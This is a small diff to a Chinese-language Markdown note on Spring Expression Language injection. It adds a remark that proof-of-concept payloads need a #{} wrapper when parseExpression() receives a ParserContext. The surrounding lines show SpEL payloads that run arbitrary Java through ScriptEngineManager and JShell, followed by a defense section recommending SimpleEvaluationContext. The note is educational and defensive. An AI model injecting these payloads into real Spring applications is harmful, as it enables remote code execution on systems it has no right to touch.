@@ -130,6 +130,8 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
 ```
 
+需要注意一点的是，`parseExpression()`是包含2个参数的，如果有了第二个参数`ParserContext`，那么POC就需要用`#{}`包围才行。
+
 ## 防御
 
 使用`SimpleEvaluationContext`。
